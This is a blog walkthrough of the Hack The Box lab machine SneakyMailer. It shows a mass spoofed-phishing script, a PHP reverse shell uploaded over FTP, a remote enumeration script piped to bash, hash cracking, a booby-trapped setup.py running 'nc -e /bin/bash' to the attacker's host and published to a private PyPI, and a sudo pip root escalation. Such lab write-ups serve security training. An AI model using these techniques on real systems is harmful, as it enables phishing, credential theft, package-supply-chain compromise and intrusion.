---
published: true
title: Hackthebox Sneakymailer walkthrough
date: 2021-11-26 03:31:00 +0200
categories: [HTB]
tags: HTB
---
<img src="https://i.ibb.co/2tgV0yX/sneakymailer.png" alt="sneakymailer" border="0">

<h1>Recon</h1>
<h2>NMAP</h2>
<pre>roott@kali:~$ sudo nmap 10.10.10.197 -sV -sC -p- -A 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-27 05:55 EST
Stats: 0:17:15 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 98.61% done; ETC: 06:12 (0:00:00 remaining)
Nmap scan report for sneakycorp.htb (10.10.10.197)
Host is up (0.98s latency).
Not shown: 65528 closed ports
PORT     STATE SERVICE    VERSION
21/tcp   open  ftp        vsftpd 3.0.3
22/tcp   open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 57:c9:00:35:36:56:e6:6f:f6:de:86:40:b2:ee:3e:fd (RSA)
|   256 d8:21:23:28:1d:b8:30:46:e2:67:2d:59:65:f0:0a:05 (ECDSA)
|_  256 5e:4f:23:4e:d4:90:8e:e9:5e:89:74:b3:19:0c:fc:1a (ED25519)
25/tcp   open  smtp       Postfix smtpd
|_smtp-commands: debian, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING, 
| ssl-cert: Subject: commonName=debian
| Subject Alternative Name: DNS:debian
| Not valid before: 2020-05-14T17:12:20
|_Not valid after:  2030-05-12T17:12:20
|_ssl-date: TLS randomness does not represent time
80/tcp   open  http       nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Employee - Dashboard
143/tcp  open  imap       Courier Imapd (released 2018)
|_imap-capabilities: STARTTLS THREAD=ORDEREDSUBJECT THREAD=REFERENCES QUOTA ACL CAPABILITY completed UTF8=ACCEPTA0001 IMAP4rev1 SORT ACL2=UNION NAMESPACE ENABLE CHILDREN UIDPLUS IDLE OK
| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
| Subject Alternative Name: email:postmaster@example.com
| Not valid before: 2020-05-14T17:14:21
|_Not valid after:  2021-05-14T17:14:21
|_ssl-date: TLS randomness does not represent time
993/tcp  open  ssl/imaps?
|_imap-capabilities: THREAD=ORDEREDSUBJECT THREAD=REFERENCES QUOTA ACL CAPABILITY completed UTF8=ACCEPTA0001 IMAP4rev1 AUTH=PLAIN SORT ACL2=UNION NAMESPACE ENABLE CHILDREN UIDPLUS IDLE OK
| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
| Subject Alternative Name: email:postmaster@example.com
| Not valid before: 2020-05-14T17:14:21
|_Not valid after:  2021-05-14T17:14:21
|_ssl-date: TLS randomness does not represent time
8080/tcp open  http       nginx 1.14.2
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: nginx/1.14.2
|_http-title: Welcome to nginx!
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=11/27%OT=21%CT=1%CU=40029%PV=Y%DS=2%DC=T%G=Y%TM=5FC0DF
OS:4C%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=C)OP
OS:S(O1=M54BST11NW7%O2=M54BST11NW7%O3=M54BNNT11NW7%O4=M54BST11NW7%O5=M54BST
OS:11NW7%O6=M54BST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)EC
OS:N(R=Y%DF=Y%T=40%W=FAF0%O=M54BNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 2 hops
Service Info: Host:  debian; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1025/tcp)
HOP RTT       ADDRESS
1   219.86 ms 10.10.16.1
2   136.11 ms sneakycorp.htb (10.10.10.197)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1080.13 sec</pre>
<blockquote>
<p>That`s a big scan result.</p>
<p>At the end of the scan you can see the domain so we need to add it. add <code class="language-plaintext highlighter-rouge">sneakycorp.htb</code> to /etc/hosts file </p>
</blockquote>  

<h1>Port 80</h1>
<blockquote>  
<p>Let`s see what we can find.</p>
</blockquote>  
<img src="https://i.ibb.co/xjXWFGz/3.png" alt="3" border="0">   
<blockquote>
<p>It`s a pypi server</p>
<p>Let`s check team and see what we can find</p>
</blockquote>  
<img src="https://i.ibb.co/3BbXmVJ/4.png" alt="4" border="0">
<blockquote>  
<p>All e-mails of employees including <code class="language-plaintext highlighter-rouge">ceo</code> </p>
<p>Now we need to extract e-mails for the webpage, I used online email extractor tool.</p> 
<p><a href="https://email-checker.net/extract" target="_blank">https://email-checker.net/extract</a></p>
</blockquote> 

<blockquote>
<p>crtl+a to select all and copy them.</p>  
</blockquote>  
<img src="https://i.ibb.co/hZv0F0Z/5.png" alt="5" border="0">
<blockquote>Paste them and click on extract email</blockquote>  
<img src="https://i.ibb.co/bXdKgKg/6.png" alt="6" border="0">
<blockquote>Result</blockquote> 
<img src="https://i.ibb.co/RSBHtZX/7.png" alt="7" border="0">
  
<blockquote>  
<p>Now save it all in a fill name it <code class="language-plaintext highlighter-rouge">emails</code></p>
</blockquote>
<h1>Phishing</h1>
<blockquote>  
<p>We need to sned spoofed emails to check what we can get, I used swaks</p>
<p><a href="https://github.com/jetmore/swaks" target="_blank">https://github.com/jetmore/swaks</a></p>
</blockquote>  
<pre>➜  sneakymailer swaks <span class="nt">--from</span> <span class="s2">"angelicaramos@sneakymailer.htb"</span> <span class="nt">--body</span> <span class="s2">"Test msg"</span> <span class="nt">--to</span> angelicaramos@sneakymailer.htb
<span class="o">===</span> Trying sneakymailer.htb:25...
<span class="o">===</span> Connected to sneakymailer.htb.
&lt;-  220 debian ESMTP Postfix <span class="o">(</span>Debian/GNU<span class="o">)</span>
 -&gt; EHLO m19o
&lt;-  250-debian
&lt;-  250-PIPELINING
&lt;-  250-SIZE 10240000
&lt;-  250-VRFY
&lt;-  250-ETRN
&lt;-  250-STARTTLS
&lt;-  250-ENHANCEDSTATUSCODES
&lt;-  250-8BITMIME
&lt;-  250-DSN
&lt;-  250-SMTPUTF8
&lt;-  250 CHUNKING
 -&gt; MAIL FROM:&lt;angelicaramos@sneakymailer.htb&gt;
&lt;-  250 2.1.0 Ok
 -&gt; RCPT TO:&lt;angelicaramos@sneakymailer.htb&gt;
&lt;-  250 2.1.5 Ok
 -&gt; DATA
&lt;-  354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;
 -&gt; Date: Wed, 15 Jul 2020 22:56:30 <span class="nt">-0400</span>
 -&gt; To: angelicaramos@sneakymailer.htb
 -&gt; From: angelicaramos@sneakymailer.htb
 -&gt; Subject: <span class="nb">test </span>Wed, 15 Jul 2020 22:56:30 <span class="nt">-0400</span>
 -&gt; Message-Id: &lt;20200715225630.013546@m19o&gt;
 -&gt; X-Mailer: swaks v20190914.0 jetmore.org/john/code/swaks/
 -&gt; 
 -&gt; Test msg
 -&gt; 
 -&gt; 
 -&gt; <span class="nb">.</span>
&lt;-  250 2.0.0 Ok: queued as F3049248C8
 -&gt; QUIT
&lt;-  221 2.0.0 Bye
<span class="o">===</span> Connection closed with remote host.
</pre>

<h1>Phishing script</h1>

<pre><span class="kn">import</span> <span class="nn">os</span>
<span class="k">def</span> <span class="nf">open_ressources</span><span class="p">(</span><span class="n">file_path</span><span class="p">):</span>
    <span class="k">return</span> <span class="p">[</span><span class="n">item</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">)</span> <span class="k">for</span> <span class="n">item</span> <span class="ow">in</span> <span class="nb">open</span><span class="p">(</span><span class="n">file_path</span><span class="p">).</span><span class="n">readlines</span><span class="p">()]</span>
<span class="n">wordlist</span> <span class="o">=</span> <span class="n">open_ressources</span><span class="p">(</span><span class="s">"emails"</span><span class="p">)</span>

<span class="k">for</span> <span class="n">emails</span> <span class="ow">in</span> <span class="n">wordlist</span><span class="p">:</span>
        <span class="k">print</span> <span class="s">"</span><span class="se">\n</span><span class="s">[+]Sending email to "</span> <span class="o">+</span> <span class="n">emails</span>
        <span class="n">command</span> <span class="o">=</span> <span class="s">'swaks --from "angelicaramos@sneakymailer.htb" --body "http://10.10.14.24:8080" --to '</span> <span class="o">+</span> <span class="n">emails</span> <span class="o">+</span> <span class="s">" &gt; /dev/null"</span>
        <span class="c1">#print command
</span>        <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>
</pre>

<blockquote><p>Result after running the script</p></blockquote>
<pre>➜  sneakymailer python spoof-msg.py                                                    

<span class="o">[</span>+]Sending email to airisatou@sneakymailer.htb

<span class="o">[</span>+]Sending email to angelicaramos@sneakymailer.htb

<span class="o">[</span>+]Sending email to ashtoncox@sneakymailer.htb

<span class="o">[</span>+]Sending email to bradleygreer@sneakymailer.htb
</pre>  
 
<blockquote><p>The response on listener</p></blockquote>  
<pre><span class="err">➜  m19o nc -nlvp 8080 
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::8080
Ncat: Listening on 0.0.0.0:8080
Ncat: Connection from 10.10.10.197.
Ncat: Connection from 10.10.10.197:48426.
</span><span class="nf">POST</span> <span class="nn">/</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">10.10.14.24:8080</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">python-requests/2.23.0</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">*/*</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">keep-alive</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">185</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>

firstName=Paul&amp;lastName=Byrd&amp;email=paulbyrd%40sneakymailer.htb&amp;password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&amp;rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt
</pre>
  
<blockquote><p>So we found user : paulbyrd and the password we need to decode it</p>
<p>Result after decoding</p>
</blockquote>
<pre>firstName=Paul&lastName=Byrd&email=paulbyrd@sneakymailer.htb&password=^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht&rpassword=^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht
</pre>  
  
<blockquote><p>So we Got</p>
<p>mail: paulbyrd@sneakymailer.htb
user: paulbyrd
password: ^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht</p>
<p>Now i need to install evolution and enter the creds for smpt server 10.10.10.197 and the mail we found </p>  
</blockquote>
<h2>mail 1 :</h2>  
<pre>发件人: Paul Byrd paulbyrd@sneakymailer.htb
收件人: low@debian
主题: Module testing
日期: Wed, 27 May 2020 13:28:58 -0400

Hello low


Your current task is to install, test and then erase every python module you
find in our PyPI service, let me know if you have any inconvenience.</pre>  
  
<h2>mail 2 :</h2>
<pre>发件人: Paul Byrd paulbyrd@sneakymailer.htb
收件人: root root@debian
主题: Password reset
日期: Fri, 15 May 2020 13:03:37 -0500 (2020年05月15日 14时03分37秒)

Hello administrator, I want to change this password for the developer account

Username: developer
Original-Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C

Please notify me when you do it</pre> 
  
  
<h1>FTP login</h1>
<pre>➜  m19o ftp sneakymailer.htb
Connected to sneakymailer.htb.
220 <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
Name <span class="o">(</span>sneakymailer.htb:prashant<span class="o">)</span>: developer
331 Please specify the password.
Password:
230 Login successful.
Remote system <span class="nb">type </span>is UNIX.
Using binary mode to transfer files.
ftp&gt;
</pre>  
<blockquote>dev</blockquote>
<pre>ftp&gt; <span class="nb">ls
</span>200 PORT <span class="nb">command </span>successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxr-x    8 0        1001         4096 Jul 15 22:30 dev
226 Directory send OK.
ftp&gt;
</pre>
<pre>ftp&gt; <span class="nb">ls
</span>200 PORT <span class="nb">command </span>successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 May 26 19:52 css
drwxr-xr-x    2 0        0            4096 May 26 19:52 img
<span class="nt">-rwxr-xr-x</span>    1 0        0           13742 Jun 23 09:44 index.php
drwxr-xr-x    3 0        0            4096 May 26 19:52 js
drwxr-xr-x    2 0        0            4096 May 26 19:52 pypi
drwxr-xr-x    4 0        0            4096 May 26 19:52 scss
<span class="nt">-rwxr-xr-x</span>    1 0        0           26523 May 26 20:58 team.php
drwxr-xr-x    8 0        0            4096 May 26 19:52 vendor
226 Directory send OK.
ftp&gt;
</pre>
<blockquote><p>let`s try to upload reverse shell and execute it </p></blockquote>
<pre>ftp> put shell.php
local: shell.php remote: shell.php
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
5492 bytes sent in 0.00 secs (59.5179 MB/s)</pre>
<blockquote>
<p>i tried to execute it at http://sneakycorp.htb/shell.php but did work</p>  
<p>so i checked if dev is subdomain</p></blockquote>
<img src="https://i.ibb.co/MVDyJ30/sub.png" alt="sub" border="0">
  
<blockquote><p>Lol, it is a subdomain that was easy. You can use a lot of tools to get subdomain and you can be lucky 😂</p>
<p>let`s upload the shell and execute it from http://dev.sneakycorp.htb/shell.php </p>  
</blockquote>
<h2>Shell</h2>
<pre>➜  m19o rlwrap nc -nlvp 1234 
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.10.10.197.
Ncat: Connection from 10.10.10.197:41628.
Linux sneakymailer 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2 (2020-04-29) x86_64 GNU/Linux
 00:10:18 up 26 min,  0 users,  load average: 0.04, 0.10, 0.09
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (715): Inappropriate ioctl for device
bash: no job control in this shell
www-data@sneakymailer:/$</pre>
<blockquote><p>It worked and we got in as www-data</p>
<p>let`s us SU to switch to developer user we found</p> 
</blockquote>
<pre>
www-data@sneakymailer:/$ su developer
su developer
Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C

developer@sneakymailer:/$
</pre>
<blockquote><p>i found 2 users</p></blockquote>  
<pre>developer@sneakymailer:/home$ ls
ls
low  vmail</pre>
  
<blockquote><p>Can`t get the user hash so let`s try to enumerate by Linenum.sh/p></blockquote>
<pre>developer@sneakymailer:/tmp$ curl http://10.10.14.24:8080/LinEnum.sh | bash                                                                                                                                        
curl http://10.10.14.24:8080/LinEnum.sh | bash                                                           
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                          
                                 Dload  Upload   Total   Spent    Left  Speed                            
100 46476   57 26729    0     0  12519      0  0:00:03  0:00:02  0:00:01 12525476  100 46476    0     0  18908      0  0:00:02  0:00:02 --:--:-- 18908                                                             
                                                    
#########################################################                                                
# Local Linux Enumeration & Privilege Escalation Script #                                                
#########################################################                                                
# www.rebootuser.com                                                                                     
# version 0.981                                 
                                                                                                         
[-] Debug Info                                                                                           
[+] Thorough tests = Disabled </pre>  
    
<blockquote><p>we found password at .htpasswd</p></blockquote>  
<pre>[-] htpasswd found - could contain passwords:                                                            
/var/www/pypi.sneakycorp.htb/.htpasswd                                                                   
pypi:$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/</pre> 
  
<blockquote><p>Let`s crack it</p></blockquote>
<pre>➜  m19o john hash -w=/usr/share/wordlists/rockyou.txt
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 5 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
soufianeelhaoui  (pypi)
1g 0:00:00:12 DONE (2020-07-16 00:43) 0.07757g/s 277312p/s 277312c/s 277312C/s souheib2..sottod
Use the "--show" option to display all of the cracked passwords reliably
Session completed</pre>
  
  
<blockquote><p>Remember the mail we got for low user</p></blockquote>
<pre>Hello low


Your current task is to install, test and then erase every python module you 
find in our PyPI service, let me know if you have any inconvenience.</pre>
  
<h1 id="building-the-package">Building the package</h1>
<blockquote><p><a href="https://pypi.org/project/pypiserver/#upload-with-setuptools" target="_blank">https://pypi.org/project/pypiserver/#upload-with-setuptools</a></p></blockquote>
<blockquote><p><a href="https://packaging.python.org/tutorials/packaging-projects/" target="_blank">https://packaging.python.org/tutorials/packaging-projects/</a></p></blockquote>
<blockquote><p><a href="https://packaging.python.org/guides/distributing-packages-using-setuptools/" target="_blank">https://packaging.python.org/guides/distributing-packages-using-setuptools/</a></p></blockquote>
  
<p>i have to make two files </p>
<ul><li>.pypirc</li><li>setup.py</li></ul>
  
<p>The file <code class="language-plaintext highlighter-rouge">.pypirc</code>will give me authority and setup.py will be contain the package</p>
  
<blockquote><p>.pypirc</p></blockquote>
<pre>[distutils]
index-servers = local

[local]
repository: http://pypi.sneakycorp.htb:8080
username: pypi
password: soufianeelhaoui</pre> 

<blockquote><p>setup.py</p>
<p>will contain the reverse shell</p>  
</blockquote>  
  
<pre><span class="kn">import</span> <span class="nn">setuptools</span>
<span class="kn">import</span> <span class="nn">os</span>

<span class="k">if</span> <span class="n">os</span><span class="p">.</span><span class="n">getuid</span><span class="p">()</span> <span class="o">==</span> <span class="mi">1000</span><span class="p">:</span>
        <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="s">'nc -e /bin/bash 10.10.17.16 2345'</span><span class="p">)</span>


<span class="n">setuptools</span><span class="p">.</span><span class="n">setup</span><span class="p">(</span>
        <span class="n">name</span><span class="o">=</span><span class="s">'sample'</span><span class="p">,</span>
        <span class="n">version</span><span class="o">=</span><span class="s">'1.2.0'</span><span class="p">,</span>
        <span class="n">description</span><span class="o">=</span><span class="s">'A sample Python project'</span><span class="p">,</span>
        <span class="n">long_description</span><span class="o">=</span><span class="s">"long_description"</span><span class="p">,</span>
        <span class="n">long_description_content_type</span><span class="o">=</span><span class="s">'text/x-rst'</span><span class="p">,</span>
        <span class="n">url</span><span class="o">=</span><span class="s">'https://github.com/pypa/sampleproject'</span><span class="p">,</span>
        <span class="n">author</span><span class="o">=</span><span class="s">'A. Random Developer'</span><span class="p">,</span>
        <span class="n">author_email</span><span class="o">=</span><span class="s">'author@example.com'</span><span class="p">,</span>
        <span class="n">license</span><span class="o">=</span><span class="s">'MIT'</span><span class="p">,</span>
        <span class="n">packages</span><span class="o">=</span><span class="n">setuptools</span><span class="p">.</span><span class="n">find_packages</span><span class="p">(),</span>
        <span class="n">install_requires</span><span class="o">=</span><span class="p">[</span><span class="s">'peppercorn'</span><span class="p">],</span>
<span class="p">)</span>
</pre>  
 
<blockquote><p>id : 1000 belongs to user "Low" , the file will be executed twice</p></blockquote>
<ul><li>Developer will run it</li><li>Low will run it too to test it </li></ul>
  
<blockquote><p>So i want the shell as "low",let`s nc and upload the files to execute it</p></blockquote>
  
<pre>developer@sneakymailer:/tmp<span class="nv">$ </span>wget <span class="nt">-r</span> <span class="nt">--no-parent</span> http://10.10.17.16:8080/pypi-pkg                                                                                                                                  
&lt;get <span class="nt">-r</span> <span class="nt">--no-parent</span> http://10.10.17.16:8080/pypi-pkg                                                                                                                                                               
<span class="nt">--2020-07-16</span> 01:06:23--  http://10.10.17.16:8080/pypi-pkg                                                                                                                                                          
Connecting to 10.10.17.16:8080... connected.
HTTP request sent, awaiting response... 301 Moved Permanently
Location: /pypi-pkg/ <span class="o">[</span>following]
<span class="nt">--2020-07-16</span> 01:06:24--  http://10.10.17.16:8080/pypi-pkg/
Connecting to 10.10.17.16:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 294 <span class="o">[</span>text/html]
Saving to: ‘10.10.17.16:8080/pypi-pkg’

10.10.14.24:8080/py 100%[<span class="o">===================&gt;]</span>     294  <span class="nt">--</span>.-KB/s    <span class="k">in </span>0s      

2020-07-16 01:06:25 <span class="o">(</span>23.1 MB/s<span class="o">)</span> - ‘10.10.17.16:8080/pypi-pkg’ saved <span class="o">[</span>294/294]


<span class="nt">--2020-07-16</span> 01:06:26--  http://10.10.17.16:8080/pypi-pkg/.pypirc
Connecting to 10.10.17.16:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 128 <span class="o">[</span>application/octet-stream]
Saving to: ‘10.10.17.16:8080/pypi-pkg/.pypirc’

10.10.14.24:8080/py 100%[<span class="o">===================&gt;]</span>     128  <span class="nt">--</span>.-KB/s    <span class="k">in </span>0s      

2020-07-16 01:06:26 <span class="o">(</span>10.6 MB/s<span class="o">)</span> - ‘10.10.17.16:8080/pypi-pkg/.pypirc’ saved <span class="o">[</span>128/128]


<span class="nt">--2020-07-16</span> 01:06:28--  http://10.10.17.16:8080/pypi-pkg/setup.py
Connecting to 10.10.17.16:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 480 <span class="o">[</span>text/plain]
Saving to: ‘10.10.14.24:8080/pypi-pkg/setup.py’

10.10.14.24:8080/py 100%[<span class="o">===================&gt;]</span>     480  <span class="nt">--</span>.-KB/s    <span class="k">in </span>0s      

2020-07-16 01:06:29 <span class="o">(</span>45.9 MB/s<span class="o">)</span> - ‘10.10.17.16:8080/pypi-pkg/setup.py’ saved <span class="o">[</span>480/480]
</pre>  
<pre>developer@sneakymailer:/tmp/10.10.14.24:8080<span class="nv">$ </span><span class="nb">ls
ls
</span>pypi-pkg
</pre>
<pre>developer@sneakymailer:/tmp/10.10.14.24:8080/pypi-pkg<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-a</span>
<span class="nb">ls</span> <span class="nt">-a</span>
<span class="nb">.</span>  ..  .pypirc  setup.py
</pre>
 
<h1>Executing the package</h1>  
<blockquote><p>Setting the path to current dir</p></blockquote>
<pre>developer@sneakymailer:/tmp/10.10.17.16:8080/pypi-pkg<span class="nv">$ HOME</span><span class="o">=</span><span class="sb">`</span><span class="nb">pwd</span><span class="sb">`</span>
</pre>  
<blockquote><p>Running setup.py</p></blockquote>
<pre>developer@sneakymailer:~<span class="nv">$ </span>python3 setup.py sdist register <span class="nt">-r</span> <span class="nb">local </span>upload <span class="nt">-r</span> <span class="nb">local</span>
&lt;n3 setup.py sdist register <span class="nt">-r</span> <span class="nb">local </span>upload <span class="nt">-r</span> <span class="nb">local
</span>running sdist
running egg_info
creating sample.egg-info
writing sample.egg-info/PKG-INFO
writing dependency_links to sample.egg-info/dependency_links.txt
writing requirements to sample.egg-info/requires.txt
writing top-level names to sample.egg-info/top_level.txt
writing manifest file <span class="s1">'sample.egg-info/SOURCES.txt'</span>
reading manifest file <span class="s1">'sample.egg-info/SOURCES.txt'</span>
writing manifest file <span class="s1">'sample.egg-info/SOURCES.txt'</span>
warning: sdist: standard file not found: should have one of README, README.rst, README.txt, README.md

running check
creating sample-1.2.0
creating sample-1.2.0/sample.egg-info
copying files to sample-1.2.0...
copying setup.py -&gt; sample-1.2.0
copying sample.egg-info/PKG-INFO -&gt; sample-1.2.0/sample.egg-info
copying sample.egg-info/SOURCES.txt -&gt; sample-1.2.0/sample.egg-info
copying sample.egg-info/dependency_links.txt -&gt; sample-1.2.0/sample.egg-info
copying sample.egg-info/requires.txt -&gt; sample-1.2.0/sample.egg-info
copying sample.egg-info/top_level.txt -&gt; sample-1.2.0/sample.egg-info
Writing sample-1.2.0/setup.cfg
creating dist
Creating <span class="nb">tar </span>archive
removing <span class="s1">'sample-1.2.0'</span> <span class="o">(</span>and everything under it<span class="o">)</span>
running register
Registering sample to http://pypi.sneakycorp.htb:8080
Server response <span class="o">(</span>200<span class="o">)</span>: OK
WARNING: Registering is deprecated, use twine to upload instead <span class="o">(</span>https://pypi.org/p/twine/<span class="o">)</span>
running upload
Submitting dist/sample-1.2.0.tar.gz to http://pypi.sneakycorp.htb:8080
Server response <span class="o">(</span>200<span class="o">)</span>: OK
WARNING: Uploading via this <span class="nb">command </span>is deprecated, use twine to upload instead <span class="o">(</span>https://pypi.org/p/twine/<span class="o">)</span>
</pre>  

<h1>User flag!.</h1>  
<pre>➜  sneakymailer rlwrap nc <span class="nt">-nlvp</span> 2345                                   
Ncat: Version 7.80 <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
Ncat: Listening on :::2345
Ncat: Listening on 0.0.0.0:2345
Ncat: Connection from 10.10.10.197.
Ncat: Connection from 10.10.10.197:45674.
python <span class="nt">-c</span> <span class="s2">"import pty;pty.spawn('/bin/bash')"</span>
low@sneakymailer:/<span class="nv">$ </span><span class="nb">whoami
whoami
</span>low
</pre>  
<pre>low@sneakymailer:~<span class="nv">$ </span><span class="nb">cat </span>user.txt
<span class="nb">cat </span>user.txt
a5b----------------------------a9
</pre>

<h1>Root flag!.</h1>
<h2>Privilege escalation</h2>  
<pre>low@sneakymailer:~$ sudo -l
sudo: unable to resolve host sneakymailer: Temporary failure in name resolution
Matching Defaults entries for low on sneakymailer:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User low may run the following commands on sneakymailer:
    (root) NOPASSWD: /usr/bin/pip3</pre>  
 
  
<blockquote><p>Go to<a href="https://gtfobins.github.io/gtfobins/pip/" target="_blank">https://gtfobins.github.io/gtfobins/pip/</a>and search for pip</p></blockquote>  
<pre><span class="n">TF</span><span class="o">=</span><span class="err">$</span><span class="p">(</span><span class="n">mktemp</span> <span class="o">-</span><span class="n">d</span><span class="p">)</span>
<span class="n">echo</span> <span class="s">"import os; os.execl('/bin/sh', 'sh', '-c', 'sh &lt;$(tty) &gt;$(tty) 2&gt;$(tty)')"</span> <span class="o">&gt;</span> <span class="err">$</span><span class="n">TF</span><span class="o">/</span><span class="n">setup</span><span class="p">.</span><span class="n">py</span>
<span class="n">pip</span> <span class="n">install</span> <span class="err">$</span><span class="n">TF</span>
</pre>
<pre>low@sneakymailer:~<span class="nv">$ TF</span><span class="o">=</span><span class="si">$(</span><span class="nb">mktemp</span> <span class="nt">-d</span><span class="si">)</span>
low@sneakymailer:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"import os; os.execl('/bin/sh', 'sh', '-c', 'sh &lt;</span><span class="si">$(</span><span class="nb">tty</span><span class="si">)</span><span class="s2"> &gt;</span><span class="si">$(</span><span class="nb">tty</span><span class="si">)</span><span class="s2"> 2&gt;</span><span class="si">$(</span><span class="nb">tty</span><span class="si">)</span><span class="s2">')"</span> <span class="o">&gt;</span> <span class="nv">$TF</span>/setup.py
low@sneakymailer:~<span class="nv">$ </span><span class="nb">sudo </span>pip3 <span class="nb">install</span> <span class="nv">$TF</span>
</pre>
<pre>low@sneakymailer:~<span class="nv">$ </span><span class="nb">sudo </span>pip3 <span class="nb">install</span> <span class="nv">$TF</span>
<span class="nb">sudo</span>: unable to resolve host sneakymailer: Temporary failure <span class="k">in </span>name resolution
Processing /tmp/tmp.tQid5dJuNf
<span class="c"># bash</span>
root@sneakymailer:/tmp/pip-req-build-9k8kjhct# <span class="nb">whoami
</span>root
</pre>
<p>And we are "ROOT"!.</p>  
<pre>root@sneakymailer:~# <span class="nb">cat </span>root.txt
11----------------------------ff
root@sneakymailer:~#
</pre>
  
<h1>Thanks for Reading 🙏</h1>
